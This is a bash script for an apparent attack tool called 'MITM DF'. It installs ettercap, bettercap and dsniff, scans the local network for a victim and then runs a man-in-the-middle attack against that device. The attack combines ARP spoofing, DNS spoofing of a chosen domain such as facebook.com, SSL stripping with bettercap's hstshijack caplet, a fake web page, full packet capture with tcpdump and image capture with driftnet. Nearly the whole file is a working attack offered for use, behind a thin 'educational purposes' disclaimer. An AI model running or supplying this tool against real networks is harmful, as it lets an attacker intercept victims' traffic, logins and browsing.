#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}"
echo "   M I T M  -  D F"
echo -e "${NC}"
echo -e "${GREEN}Developer: @A_Y_TR${NC}"
echo -e "${BLUE}Telegram Channel: https://t.me/cybersecurityTemDF${NC}"
echo -e "${RED}Warning: This tool is for educational and security purposes only. Illegal use is prohibited!${NC}"

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This tool must be run as root!..The developer is not responsible for any incorrect use of the tool...! ${NC}"
    exit 1
fi

# Function to install required tools
install_tools() {
    echo -e "${BLUE}[+] Updating system and installing required tools...${NC}"
    apt update -y && apt upgrade -y
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to update system!${NC}"
        echo -e "${YELLOW}[!] Trying alternative package managers...${NC}"
        apt-get update -y && apt-get upgrade -y
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] System update failed. Please check your internet connection.${NC}"
            exit 1
        fi
    fi

    # Install tools with error handling
    for tool in ettercap-text-only sslstrip iptables nmap dsniff driftnet bettercap python3; do
        echo -e "${BLUE}[+] Installing $tool...${NC}"
        apt install -y $tool
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] Failed to install $tool! Trying alternative methods...${NC}"
            apt-get install -y $tool || {
                echo -e "${RED}[!] Installation of $tool failed. Please install it manually.${NC}"
                exit 1
            }
        fi
    done
    echo -e "${GREEN}[✔] All tools installed successfully!${NC}"
}

# Function to uninstall tools
uninstall_tools() {
    echo -e "${RED}[+] Uninstalling tools...${NC}"
    for tool in ettercap-text-only sslstrip iptables nmap dsniff driftnet bettercap python3; do
        apt remove -y $tool
    done
    echo -e "${GREEN}[✔] Tools uninstalled successfully!${NC}"
    echo -e "${CYAN}Thanks for using MITM DF! Developed by «آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم»${NC}"
    exit 0
}

# Function to enable IP forwarding
enable_ip_forwarding() {
    echo -e "${BLUE}[+] Enabling IP Forwarding...${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sysctl -w net.ipv4.ip_forward=1
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Failed to enable IP forwarding!${NC}"
        echo -e "${YELLOW}[!] Trying alternative method...${NC}"
        sysctl -p /etc/sysctl.conf
        if [[ $? -ne 0 ]]; then
            echo -e "${RED}[!] IP forwarding could not be enabled. Please check your system configuration.${NC}"
            exit 1
        fi
    fi
    echo -e "${GREEN}[✔] IP Forwarding enabled successfully!${NC}"
}

# Function to detect network interface and router IP
detect_network() {
    echo -e "${BLUE}[+] Detecting network interface and router IP...${NC}"
    INTERFACE=$(ip route | grep default | awk '{print $5}')
    if [[ -z "$INTERFACE" ]]; then
        echo -e "${RED}[!] Network interface not found!${NC}"
        echo -e "${YELLOW}[!] Trying alternative detection method...${NC}"
        INTERFACE=$(ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2;getline}' | head -n 1 | tr -d ' ')
        if [[ -z "$INTERFACE" ]]; then
            echo -e "${RED}[!] Network interface could not be detected. Please configure your network manually.${NC}"
            exit 1
        fi
    fi
    echo -e "${GREEN}[✔] Network Interface: $INTERFACE${NC}"

    ROUTER_IP=$(ip route | grep default | awk '{print $3}')
    if [[ -z "$ROUTER_IP" ]]; then
        echo -e "${RED}[!] Router IP not found!${NC}"
        echo -e "${YELLOW}[!] Trying alternative detection method...${NC}"
        ROUTER_IP=$(ip route | grep via | awk '{print $3}' | head -n 1)
        if [[ -z "$ROUTER_IP" ]]; then
            echo -e "${RED}[!] Router IP could not be detected. Please configure your network manually.${NC}"
            exit 1
        fi
    fi
    echo -e "${GREEN}[✔] Router IP: $ROUTER_IP${NC}"
}

# Function to scan connected devices
scan_devices() {
    echo -e "${BLUE}[+] Scanning connected devices...${NC}"
    nmap -sn "$ROUTER_IP/24" | grep "Nmap scan report for" | awk '{print $5}' > devices.txt
    if [[ ! -s devices.txt ]]; then
        echo -e "${RED}[!] No devices found!${NC}"
        echo -e "${YELLOW}[!] Trying alternative scanning method...${NC}"
        arp-scan --localnet | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $1}' > devices.txt
        if [[ ! -s devices.txt ]]; then
            echo -e "${RED}[!] No devices detected. Please check your network connection.${NC}"
            exit 1
        fi
    fi
    cat devices.txt
    echo -e "${YELLOW}[!] Choose the target IP from the list above: ${NC}"
    read -p "Target IP: " TARGET_IP
}

# Main script logic
echo -e "${YELLOW}[!] Enter 0 to uninstall tools or any other key to continue: ${NC}"
read -p "Choice: " CHOICE

if [[ "$CHOICE" == "0" ]]; then
    uninstall_tools
fi

install_tools
enable_ip_forwarding
detect_network
scan_devices

echo -e "${YELLOW}[!] Enter the domain to spoof (e.g., facebook.com): ${NC}"
read -p "Domain: " SPOOF_DOMAIN

echo -e "${YELLOW}[!] Enter the IP address to redirect to (e.g., 192.168.1.100): ${NC}"
read -p "IP Address: " REDIRECT_IP

echo -e "${YELLOW}[!] Enter the fake URL to display (e.g., http://example.com): ${NC}"
read -p "Fake URL: " FAKE_URL

ETTER_DNS="/etc/ettercap/etter.dns"
echo -e "${BLUE}[+] Modifying etter.dns for DNS Spoofing...${NC}"
echo "$SPOOF_DOMAIN A $REDIRECT_IP" >> "$ETTER_DNS"
echo "*.$SPOOF_DOMAIN A $REDIRECT_IP" >> "$ETTER_DNS"

echo -e "${BLUE}[+] Starting ARP Spoofing on $TARGET_IP ...${NC}"
arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$ROUTER_IP" > /dev/null 2>&1 &

echo -e "${BLUE}[+] Starting DNS Spoofing...${NC}"
ettercap -T -q -i "$INTERFACE" -P dns_spoof -M arp > /dev/null 2>&1 &

echo -e "${BLUE}[+] Starting SSL Stripping with BetterCap...${NC}"
bettercap -iface "$INTERFACE" -caplet hstshijack/hstshijack > /dev/null 2>&1 &

echo -e "${BLUE}[+] Starting Python HTTP Server to display fake page...${NC}"
DOWNLOAD_DIR="$HOME/Downloads/mitmdf_downloads"
mkdir -p "$DOWNLOAD_DIR"
cd "$DOWNLOAD_DIR"
echo "<html><body><h1>Welcome to $FAKE_URL</h1></body></html>" > index.html
python3 -m http.server 80 > /dev/null 2>&1 &

echo -e "${BLUE}[+] Starting packet capture with tcpdump...${NC}"
tcpdump -i "$INTERFACE" -A > mitm_log.txt &

echo -e "${BLUE}[+] Starting Driftnet to capture images...${NC}"
driftnet -i "$INTERFACE" -d "$DOWNLOAD_DIR" > /dev/null 2>&1 &

echo -e "${GREEN}[✔] Attack is running!${NC}"
echo -e "${YELLOW}[!] Press Ctrl+C to stop the attack.${NC}"

wait

cleanup() {
    echo -e "${RED}[+] Stopping attack and resetting settings...${NC}"
    killall arpspoof sslstrip ettercap tcpdump bettercap driftnet python3
    iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    echo 0 > /proc/sys/net/ipv4/ip_forward
    sysctl -w net.ipv4.ip_forward=0
    rm -f devices.txt mitm_log.txt
    echo -e "${GREEN}[✔] Attack stopped and settings reset successfully!${NC}"
    echo -e "${CYAN}Thanks for using MITM DF! Developed by «آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم»${NC}"
    exit 0
}

trap cleanup SIGINT
